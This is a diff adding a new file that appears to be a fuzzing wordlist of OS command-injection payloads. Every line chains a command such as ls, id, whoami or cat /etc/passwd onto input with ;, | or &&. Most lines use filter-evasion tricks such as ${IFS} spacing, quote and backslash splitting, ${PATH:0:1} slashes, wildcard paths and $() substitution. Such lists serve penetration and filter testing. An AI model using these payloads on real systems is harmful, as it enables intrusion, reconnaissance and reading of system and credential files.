@@ -1,0 +1,138 @@
+; l\s
+; i\d
+; p\wd
+; whoa\mi
+| l\s
+| i\d
+| p\wd
+| whoa\mi
+|| l\s
+|| i\d
+|| p\wd
+|| whoa\mi
+& l\s
+& i\d
+& p\wd
+& whoa\mi
+&& l\s
+&& i\d
+&& p\wd
+&& whoa\mi
+; /b\in/l\s
+; /b\in/i\d
+; /b\in/p\wd
+; /u\sr/b\in/whoa\mi
+| /b\in/l\s
+| /b\in/i\d
+| /b\in/p\wd
+| /u\sr/b\in/whoa\mi
+; cat${IFS}/etc/passwd
+; cat$IFS/etc/passwd
+; cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
+| cat${IFS}/etc/passwd
+| cat$IFS/etc/passwd
+| cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
+; cat</etc/passwd
+; cat<</etc/passwd
+| cat</etc/passwd
+| cat<</etc/passwd
+; {cat,/etc/passwd}
+; {ls,-la}
+| {cat,/etc/passwd}
+| {ls,-la}
+; cat /e''tc/pa''sswd
+; cat /e""tc/pa""sswd
+| cat /e''tc/pa''sswd
+| cat /e""tc/pa""sswd
+; w'h'o'a'm'i
+; w"h"o"a"m"i
+| w'h'o'a'm'i
+| w"h"o"a"m"i
+; echo${IFS}vulnerable
+; echo$IFS$9vulnerable
+| echo${IFS}vulnerable
+| echo$IFS$9vulnerable
+; ${PATH:0:1}bin${PATH:0:1}ls
+; ${PATH:~0:~1}bin${PATH:~0:~1}ls
+| ${PATH:0:1}bin${PATH:0:1}ls
+| ${PATH:~0:~1}bin${PATH:~0:~1}ls
+; l${x}s
+; i${x}d
+; p${x}wd
+; whoa${x}mi
+| l${x}s
+| i${x}d
+| p${x}wd
+| whoa${x}mi
+; ls -la $HOME
+; ls -la ~
+| ls -la $HOME
+| ls -la ~
+; cat /etc/issue
+; cat /etc/*release*
+| cat /etc/issue
+| cat /etc/*release*
+; l$@s
+; i$@d
+; p$@wd
+; whoa$@mi
+| l$@s
+| i$@d
+| p$@wd
+| whoa$@mi
+; ls${u}
+; id${u}
+; pwd${u}
+; whoami${u}
+| ls${u}
+| id${u}
+| pwd${u}
+| whoami${u}
+; who$()ami
+; who${}ami
+| who$()ami
+| who${}ami
+; /???/??/l?
+; /???/??/i?
+; /???/??/p??
+| /???/??/l?
+| /???/??/i?
+| /???/??/p??
+; /???/???/whoa??
+; /???/???/ls
+| /???/???/whoa??
+| /???/???/ls
+; echo vulnerable | sed 's/e/E/'
+; echo vulnerable | tr 'a-z' 'A-Z'
+| echo vulnerable | sed 's/e/E/'
+| echo vulnerable | tr 'a-z' 'A-Z'
+; $(echo ls)
+; $(echo id)
+; $(echo pwd)
+; $(echo whoami)
+| $(echo ls)
+| $(echo id)
+| $(echo pwd)
+| $(echo whoami)
+; `echo ls`
+; `echo id`
+; `echo pwd`
+; `echo whoami`
+| `echo ls`
+| `echo id`
+| `echo pwd`
+| `echo whoami`
+; ls;#
+; id;#
+; pwd;#
+; whoami;#
+| ls;#
+| id;#
+| pwd;#
+| whoami;#
+; a=l;b=s;$a$b
+; a=i;b=d;$a$b
+; a=p;b=wd;$a$b
+| a=l;b=s;$a$b
+| a=i;b=d;$a$b
+| a=p;b=wd;$a$b
